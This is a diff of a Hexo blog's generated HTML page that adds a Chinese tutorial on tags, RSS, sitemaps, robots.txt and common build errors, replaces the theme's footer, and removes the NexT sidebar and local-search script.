+<p>当然 <code>tags</code> 标签也可以这么写<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">---</span><br><span class="line">... (此处省略前后文)</span><br><span class="line">tags: [Hexo,Next]</span><br><span class="line">...</span><br><span class="line">---</span><br></pre></td></tr></table></figure></p>
+<p><code>categories</code> 字段为分类，<code>description</code> 字段为描述。</p>
+<h3 id="标签删除的方法"><a href="#标签删除的方法" class="headerlink" title="标签删除的方法"></a>标签删除的方法</h3><p>理论上在 MD 文件的头部可以删除标签 然后重新生成可以更新 <code>tags</code> 标签页<br>如果无法成功删除的时候，可以尝试下面的方法:<br>删除根目录的 <code>db.json</code> 然后 <code>hexo clean &amp;&amp; hexo g</code></p>
+<h3 id="添加RSS"><a href="#添加RSS" class="headerlink" title="添加RSS"></a>添加RSS</h3><p>需要安装 <code>hexo-generator-feed</code> 插件</p>
+<p>RSS还需要一个Feed链接，而这个链接是通过 <code>hexo-generator-feed</code>  插件生成的，所以要先安装插件：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-feed --save</span><br></pre></td></tr></table></figure>
+<p>然后去配置 <strong>站点配置文件</strong> 里的Feed信息：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim _config.yml</span><br></pre></td></tr></table></figure>
+<p>找到如下内容：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"># 配置RSS</span><br><span class="line">feed:</span><br><span class="line">  type: atom</span><br><span class="line">  path: atom.xml</span><br><span class="line">  limit: 20</span><br><span class="line">  content: &apos;true&apos;</span><br></pre></td></tr></table></figure>
+<p><code>feed</code> 属性下的各个子属性的含义借用feed官方英文解释如下：</p>
+<ul>
+<li>type - Feed type. (atom/rss2)</li>
+<li>path - Feed path. (Default: atom.xml/rss2.xml)</li>
+<li>limit - Maximum number of posts in the feed (Use 0 or false to show all posts)</li>
+<li>hub - URL of the PubSubHubbub hubs (Leave it empty if you don’t use it)</li>
+<li>content - (optional) set to ‘true’ to include the contents of the entire post in the feed.</li>
+</ul>
+<h3 id="SEO优化"><a href="#SEO优化" class="headerlink" title="SEO优化"></a>SEO优化</h3><blockquote>
+<p>seo优化对于网站是否能被搜索引擎快速收录有很大帮助，因此适当做一些seo还是有必要的，以下内容参考：<a href="https://lancelot_lewis.coding.me/2016/08/16/blog/Hexo-NexT-SEO/" target="_blank" rel="noopener">https://lancelot_lewis.coding.me/2016/08/16/blog/Hexo-NexT-SEO/</a></p>
+</blockquote>
+<h4 id="添加Sitemap文件"><a href="#添加Sitemap文件" class="headerlink" title="添加Sitemap文件"></a>添加Sitemap文件</h4><p>安装以下2个插件，然后重启hexo后，网站根目录（source）下会生成sitemap.xml与baidusitemap.xml文件，搜索引擎在爬取时会参照文件中的url去收录。</p>
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">npm install hexo-generator-sitemap --save-dev</span><br><span class="line">hexo d -g</span><br><span class="line">npm install hexo-generator-baidu-sitemap --save-dev</span><br><span class="line">hexo d -g</span><br></pre></td></tr></table></figure>
+<h4 id="添加robots-txt"><a href="#添加robots-txt" class="headerlink" title="添加robots.txt"></a>添加robots.txt</h4><p>新建robots.txt文件，添加以下文件内容，把robots.txt放在hexo站点的source文件下。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">User-agent: * Allow: /</span><br><span class="line">Allow: /archives/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Disallow: /js/</span><br><span class="line">Disallow: /css/</span><br><span class="line">Disallow: /fonts/</span><br><span class="line">Disallow: /vendors/</span><br><span class="line">Sitemap: http://lfoder.github.io/sitemap.xml</span><br><span class="line">Sitemap: http://lfoder.github.io/baidusitemap.xml</span><br></pre></td></tr></table></figure>
+<h2 id="各种坑和解决方法"><a href="#各种坑和解决方法" class="headerlink" title="各种坑和解决方法"></a>各种坑和解决方法</h2><h3 id="导航解析错误"><a href="#导航解析错误" class="headerlink" title="导航解析错误"></a>导航解析错误</h3><blockquote>
+<p>问题描述:</p>
+</blockquote>
+<p>你发现你写的MD格式都是正常的，但是发现Next自动解析的导航，却不合人意，甚至你可以发现正文的代码段混乱什么的情况</p>
+<blockquote>
+<p>解决方法:</p>
+</blockquote>
+<p>找找全文代码段中的用来划分代码段用的三个点末尾是否出现空格，删除之，解决。</p>
+<h3 id="ERROR-Deployer-not-found-git"><a href="#ERROR-Deployer-not-found-git" class="headerlink" title="ERROR Deployer not found: git"></a>ERROR Deployer not found: git</h3><blockquote>
+<p>问题描述:</p>
+</blockquote>
+<p>在执行 <code>hexo d</code> 的时候，出现 <code>ERROR Deployer not found: git</code>错误</p>
+<blockquote>
+<p>解决方案:</p>
+</blockquote>
+<p>进入博客根目录，执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">npm install  hexo-deployer-git --save</span><br></pre></td></tr></table></figure></p>
+<h3 id="关于-Hexo-的-Local-Search失-效的问题"><a href="#关于-Hexo-的-Local-Search失-效的问题" class="headerlink" title="关于 Hexo 的 Local Search失 效的问题"></a>关于 Hexo 的 Local Search失 效的问题</h3><blockquote>
+<p>问题描述:</p>
+</blockquote>
+<p>你会发现一开始你的Blog搜索功能还是正常的，搜索出结果一直在转圈圈等待，或者 搜索功能能搜索但是不能跳转过去，随着添加了几篇文章以后，搜索就不正常了，访问你的博客 <code>http://你的博客域名/search.xml</code> 的时候，提示有存在不可解析的字节的错误，大致如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">This page contains the following errors:</span><br><span class="line"></span><br><span class="line">error on line 66 at column 35: Input is not proper UTF-8, indicate encoding !</span><br><span class="line">Bytes: 0x08 0xE8 0xAF 0x84</span><br><span class="line"></span><br><span class="line">Below is a rendering of the page up to the first error.</span><br></pre></td></tr></table></figure>
+<p> 此时，是因为你的xml解析有问题，换成json来解析即可，编辑你的站点配置文件 <code>_config.yml</code></p>
+<p>找到搜索的地方 把 Search的xml解析改成json解析，具体改完后 如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search:</span><br><span class="line">  path: search.json</span><br><span class="line">  field: post</span><br><span class="line">  format: html</span><br><span class="line">  limit: 10000</span><br></pre></td></tr></table></figure>
+<p>完美解决搜索问题。</p>
 
         </div>
-        
-          
-  
-  <div class="sidebar-toggle">
-    <div class="sidebar-toggle-line-wrap">
-      <span class="sidebar-toggle-line sidebar-toggle-line-first"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-middle"></span>
-      <span class="sidebar-toggle-line sidebar-toggle-line-last"></span>
-    </div>
-  </div>
-
-  <aside id="sidebar" class="sidebar">
     
-      <div id="sidebar-dimmer"></div>
-    
-    <div class="sidebar-inner">
 
-      
-
-      
-
-      <section class="site-overview-wrap sidebar-panel sidebar-panel-active">
-        <div class="site-overview">
-          <div class="site-author motion-element" itemprop="author" itemscope itemtype="http://schema.org/Person">
+</div>
             
-              <p class="site-author-name" itemprop="name">lfoder</p>
-              <p class="site-description motion-element" itemprop="description">只为做笔记</p>
-          </div>
-
-          
-            <nav class="site-state motion-element">
-              
-                <div class="site-state-item site-state-posts">
-                
-                  <a href="/archives/">
-                
-                    <span class="site-state-item-count">11</span>
-                    <span class="site-state-item-name">日志</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-categories">
-                  <a href="categories/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">3</span>
-                    <span class="site-state-item-name">分类</span>
-                  </a>
-                </div>
-              
-
-              
-                
-                
-                <div class="site-state-item site-state-tags">
-                  <a href="tags/index.html">
-                    
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                      
-                    
-                    <span class="site-state-item-count">18</span>
-                    <span class="site-state-item-name">标签</span>
-                  </a>
-                </div>
-              
-            </nav>
-          
-
-          
-            <div class="feed-link motion-element">
-              <a href="atom.xml" rel="alternate">
-                <i class="fa fa-rss"></i>
-                RSS
-              </a>
-            </div>
-          
-
-          
-
-          
-          
-
-          
-          
-
-          
-            
-          
-          
-
-        </div>
-      </section>
-
-      
-
-      
-
+        </section>
     </div>
-  </aside>
-
-
-        
-      </div>
-    </main>
-
-    <footer id="footer" class="footer">
-      <div class="footer-inner">
-        <div class="copyright">&copy; <span itemprop="copyrightYear">2018</span>
-  <span class="with-love">
-    <i class="fa fa-user"></i>
-  </span>
-  <span class="author" itemprop="copyrightHolder">lfoder</span>
-
-  
-
-  
 </div>
 
 
-  
+
+    <div class="row">
+        <div class="col-sm-12">
+            <div class="wrap-pagination">
+                <a class="disabled" href="/">
+                    <i class="fa fa-chevron-left" aria-hidden="true"></i>
+                </a>
+                <a class="" href="/page/2/">
+                    <i class="fa fa-chevron-right" aria-hidden="true"></i>
+                </a>
+            </div>
+        </div>
+    </div>
 
 
 
-  <div class="powered-by">由 <a class="theme-link" target="_blank" rel="external nofollow" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+</div>
+
+<!-- Footer -->
+<div class="push"></div>
+
+<footer class="footer-content">
+    <div class="container">
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-6 col-lg-6 footer-about">
+                <h2>About</h2>
+                <p>
+                    Nothing was here.
+                </p>
+            </div>
+            
+    <div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 recent-posts">
+        <h2>Recent Posts</h2>
+        <ul>
+            
+            <li>
+                <a class="footer-post" href="2018/04/12/Nmap扫描与发现漏洞全技巧/">Nmap扫描与发现漏洞全技巧</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="2018/04/11/DarkNet/">暗网导航</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="2018/03/12/Mounty挂载失败解决方法/">Mounty挂载失败解决方法</a>
+            </li>
+            
+            <li>
+                <a class="footer-post" href="2018/03/09/MacOS安装PostgreSQL/">MacOS安装PostgreSQL</a>
+            </li>
+            
+        </ul>
+    </div>
 
 
 
-  <span class="post-meta-divider">|</span>
-
-
-
-  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" rel="external nofollow" href="https://github.com/theme-next/hexo-theme-next">NexT.Gemini</a> v6.0.4</div>
-
-
-
-
+            
+<div class="col-xs-6 col-sm-6 col-md-3 col-lg-3 footer-categories">
+    <h2>Categories</h2>
+    <ul>
         
-
-
-
-
-
-
-
-
+        <li>
+            <a class="footer-post" href="categories/Nmap教程/">Nmap教程</a>
+        </li>
         
-      </div>
-    </footer>
-
-    
-      <div class="back-to-top">
-        <i class="fa fa-arrow-up"></i>
+        <li>
+            <a class="footer-post" href="categories/Hexo教程/">Hexo教程</a>
+        </li>
         
-      </div>
-    
+        <li>
+            <a class="footer-post" href="categories/MetaSploit教程/">MetaSploit教程</a>
+        </li>
+        
+    </ul>
+</div>
+
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <ul class="list-inline footer-social-icons">
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="mailto:lfoder@hotmail.com">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-envelope-o"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                    
+                    <li class="list-inline-item">
+                        <a href="\#">
+                            <span class="footer-icon-container">
+                                <i class="fa fa-rss"></i>
+                            </span>
+                        </a>
+                    </li>
+                    
+                </ul>
+            </div>
+        </div>
+        <div class="row">
+            <div class="col-xs-12 col-sm-12 col-md-12 col-lg-12">
+                <div class="footer-copyright">
+                    
+                </div>
+            </div>
+        </div>
+    </div>
+</footer>
+
+<!-- After footer scripts -->
+
+<!-- jQuery -->
+<script src="//code.jquery.com/jquery-2.1.4.min.js"></script>
+
+<!-- Tween Max -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/gsap/1.18.5/TweenMax.min.js"></script>
+
+<!-- Gallery -->
+<script src="//cdnjs.cloudflare.com/ajax/libs/featherlight/1.3.5/featherlight.min.js" type="text/javascript" charset="utf-8"></script>
+
+<!-- Custom JavaScript -->
+<script src="js/main.js"></script>
+
+<!-- Disqus Comments -->
 
-    
 
-  </div>
-
-  
-
-<script type="text/javascript">
-  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
-    window.Promise = null;
-  }
-</script>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-  
-  
-    <script type="text/javascript" src="lib/jquery/index.js?v=2.1.3"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="lib/velocity/velocity.min.js?v=1.2.1"></script>
-  
-
-  
-  
-    <script type="text/javascript" src="lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
-  
-
-
-  
-
-
-  <script type="text/javascript" src="js/src/utils.js?v=6.0.4"></script>
-
-  <script type="text/javascript" src="js/src/motion.js?v=6.0.4"></script>
-
-
-
-  
-  
-
-
-  <script type="text/javascript" src="js/src/affix.js?v=6.0.4"></script>
-
-  <script type="text/javascript" src="js/src/schemes/pisces.js?v=6.0.4"></script>
-
-
-
-  
-
-  
-
-
-  <script type="text/javascript" src="js/src/bootstrap.js?v=6.0.4"></script>
-
-
-
-  
-
-
-
-	
-
-
-
-
-
-  
-
-
-
-
-
-  
-
-
-
-
-
-
-
-
-
-
-  
-
-  <script type="text/javascript">
-    // Popup Window;
-    var isfetched = false;
-    var isXml = true;
-    // Search DB path;
-    var search_path = "search.json";
-    if (search_path.length === 0) {
-      search_path = "search.xml";
-    } else if (/json$/i.test(search_path)) {
-      isXml = false;
-    }
-    var path = "/" + search_path;
-    // monitor main search box;
-
-    var onPopupClose = function (e) {
-      $('.popup').hide();
-      $('#local-search-input').val('');
-      $('.search-result-list').remove();
-      $('#no-result').remove();
-      $(".local-search-pop-overlay").remove();
-      $('body').css('overflow', '');
-    }
-
-    function proceedsearch() {
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
-        .css('overflow', 'hidden');
-      $('.search-popup-overlay').click(onPopupClose);
-      $('.popup').toggle();
-      var $localSearchInput = $('#local-search-input');
-      $localSearchInput.attr("autocapitalize", "none");
-      $localSearchInput.attr("autocorrect", "off");
-      $localSearchInput.focus();
-    }
-
-    // search function;
-    var searchFunc = function(path, search_id, content_id) {
-      'use strict';
-
-      // start loading animation
-      $("body")
-        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
-          '<div id="search-loading-icon">' +
-          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
-          '</div>' +
-          '</div>')
-        .css('overflow', 'hidden');
-      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
-
-      
-        // ref: https://github.com/ForbesLindesay/unescape-html
-        var unescapeHtml = function(html) {
-          return String(html)
-            .replace(/&quot;/g, '"')
-            .replace(/&#39;/g, '\'')
-            .replace(/&#x3A;/g, ':')
-            // replace all the other &#x; chars
-            .replace(/&#(\d+);/g, function (m, p) { return String.fromCharCode(p); })
-            .replace(/&lt;/g, '<')
-            .replace(/&gt;/g, '>')
-            .replace(/&amp;/g, '&');
-        };
-      
-
-      $.ajax({
-        url: path,
-        dataType: isXml ? "xml" : "json",
-        async: true,
-        success: function(res) {
-          // get the contents from search data
-          isfetched = true;
-          $('.popup').detach().appendTo('.header-inner');
-          var datas = isXml ? $("entry", res).map(function() {
-            return {
-              title: $("title", this).text(),
-              content: $("content",this).text(),
-              url: $("url" , this).text()
-            };
-          }).get() : res;
-          var input = document.getElementById(search_id);
-          var resultContent = document.getElementById(content_id);
-          var inputEventFunction = function() {
-            var searchText = input.value.trim().toLowerCase();
-            var keywords = searchText.split(/[\s\-]+/);
-            if (keywords.length > 1) {
-              keywords.push(searchText);
-            }
-            var resultItems = [];
-            if (searchText.length > 0) {
-              // perform local searching
-              datas.forEach(function(data) {
-                var isMatch = false;
-                var hitCount = 0;
-                var searchTextCount = 0;
-                var title = data.title.trim();
-                var titleInLowerCase = title.toLowerCase();
-                var content = data.content.trim().replace(/<[^>]+>/g,"");
-                
-                content = unescapeHtml(content);
-                
-                var contentInLowerCase = content.toLowerCase();
-                var articleUrl = decodeURIComponent(data.url);
-                var indexOfTitle = [];
-                var indexOfContent = [];
-                // only match articles with not empty titles
-                if(title != '') {
-                  keywords.forEach(function(keyword) {
-                    function getIndexByWord(word, text, caseSensitive) {
-                      var wordLen = word.length;
-                      if (wordLen === 0) {
-                        return [];
-                      }
-                      var startPosition = 0, position = [], index = [];
-                      if (!caseSensitive) {
-                        text = text.toLowerCase();
-                        word = word.toLowerCase();
-                      }
-                      while ((position = text.indexOf(word, startPosition)) > -1) {
-                        index.push({position: position, word: word});
-                        startPosition = position + wordLen;
-                      }
-                      return index;
-                    }
-
-                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
-                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
-                  });
-                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
-                    isMatch = true;
-                    hitCount = indexOfTitle.length + indexOfContent.length;
-                  }
-                }
-
-                // show search results
-
-                if (isMatch) {
-                  // sort index by position of keyword
-
-                  [indexOfTitle, indexOfContent].forEach(function (index) {
-                    index.sort(function (itemLeft, itemRight) {
-                      if (itemRight.position !== itemLeft.position) {
-                        return itemRight.position - itemLeft.position;
-                      } else {
-                        return itemLeft.word.length - itemRight.word.length;
-                      }
-                    });
-                  });
-
-                  // merge hits into slices
-
-                  function mergeIntoSlice(text, start, end, index) {
-                    var item = index[index.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    var hits = [];
-                    var searchTextCountInSlice = 0;
-                    while (position + word.length <= end && index.length != 0) {
-                      if (word === searchText) {
-                        searchTextCountInSlice++;
-                      }
-                      hits.push({position: position, length: word.length});
-                      var wordEnd = position + word.length;
-
-                      // move to next position of hit
-
-                      index.pop();
-                      while (index.length != 0) {
-                        item = index[index.length - 1];
-                        position = item.position;
-                        word = item.word;
-                        if (wordEnd > position) {
-                          index.pop();
-                        } else {
-                          break;
-                        }
-                      }
-                    }
-                    searchTextCount += searchTextCountInSlice;
-                    return {
-                      hits: hits,
-                      start: start,
-                      end: end,
-                      searchTextCount: searchTextCountInSlice
-                    };
-                  }
-
-                  var slicesOfTitle = [];
-                  if (indexOfTitle.length != 0) {
-                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
-                  }
-
-                  var slicesOfContent = [];
-                  while (indexOfContent.length != 0) {
-                    var item = indexOfContent[indexOfContent.length - 1];
-                    var position = item.position;
-                    var word = item.word;
-                    // cut out 100 characters
-                    var start = position - 20;
-                    var end = position + 80;
-                    if(start < 0){
-                      start = 0;
-                    }
-                    if (end < position + word.length) {
-                      end = position + word.length;
-                    }
-                    if(end > content.length){
-                      end = content.length;
-                    }
-                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
-                  }
-
-                  // sort slices in content by search text's count and hits' count
-
-                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
-                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
-                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
-                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
-                      return sliceRight.hits.length - sliceLeft.hits.length;
-                    } else {
-                      return sliceLeft.start - sliceRight.start;
-                    }
-                  });
-
-                  // select top N slices in content
-
-                  var upperBound = parseInt('1');
-                  if (upperBound >= 0) {
-                    slicesOfContent = slicesOfContent.slice(0, upperBound);
-                  }
-
-                  // highlight title and content
-
-                  function highlightKeyword(text, slice) {
-                    var result = '';
-                    var prevEnd = slice.start;
-                    slice.hits.forEach(function (hit) {
-                      result += text.substring(prevEnd, hit.position);
-                      var end = hit.position + hit.length;
-                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
-                      prevEnd = end;
-                    });
-                    result += text.substring(prevEnd, slice.end);
-                    return result;
-                  }
-
-                  var resultItem = '';
-
-                  if (slicesOfTitle.length != 0) {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
-                  } else {
-                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
-                  }
-
-                  slicesOfContent.forEach(function (slice) {
-                    resultItem += "<a href='" + articleUrl + "'>" +
-                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
-                      "...</p>" + "</a>";
-                  });
-
-                  resultItem += "</li>";
-                  resultItems.push({
-                    item: resultItem,
-                    searchTextCount: searchTextCount,
-                    hitCount: hitCount,
-                    id: resultItems.length
-                  });
-                }
-              })
-            };
-            if (keywords.length === 1 && keywords[0] === "") {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
-            } else if (resultItems.length === 0) {
-              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
-            } else {
-              resultItems.sort(function (resultLeft, resultRight) {
-                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
-                  return resultRight.searchTextCount - resultLeft.searchTextCount;
-                } else if (resultLeft.hitCount !== resultRight.hitCount) {
-                  return resultRight.hitCount - resultLeft.hitCount;
-                } else {
-                  return resultRight.id - resultLeft.id;
-                }
-              });
-              var searchResultList = '<ul class=\"search-result-list\">';
-              resultItems.forEach(function (result) {
-                searchResultList += result.item;
-              })
-              searchResultList += "</ul>";
-              resultContent.innerHTML = searchResultList;
-            }
-          }
-
-          if ('auto' === 'auto') {
-            input.addEventListener('input', inputEventFunction);
-          } else {
-            $('.search-icon').click(inputEventFunction);
-            input.addEventListener('keypress', function (event) {
-              if (event.keyCode === 13) {
-                inputEventFunction();
-              }
-            });
-          }
-
-          // remove loading animation
-          $(".local-search-pop-overlay").remove();
-          $('body').css('overflow', '');
-
-          proceedsearch();
-        }
-      });
-    }
-
-    // handle and trigger popup window;
-    $('.popup-trigger').click(function(e) {
-      e.stopPropagation();
-      if (isfetched === false) {
-        searchFunc(path, 'local-search-input', 'local-search-result');
-      } else {
-        proceedsearch();
-      };
-    });
-
-    $('.popup-btn-close').click(onPopupClose);
-    $('.popup').click(function(e){
-      e.stopPropagation();
-    });
-    $(document).on('keyup', function (event) {
-      var shouldDismissSearchPopup = event.which === 27 &&
-        $('.search-popup').is(':visible');
-      if (shouldDismissSearchPopup) {
-        onPopupClose();
-      }
-    });
-  </script>
-
-
-
-
-
-  
-
-  
-
-  
-
-  
-
-  
-  
-
-  
-
-  
-
-  
-
-  
 
 </body>
+
 </html>
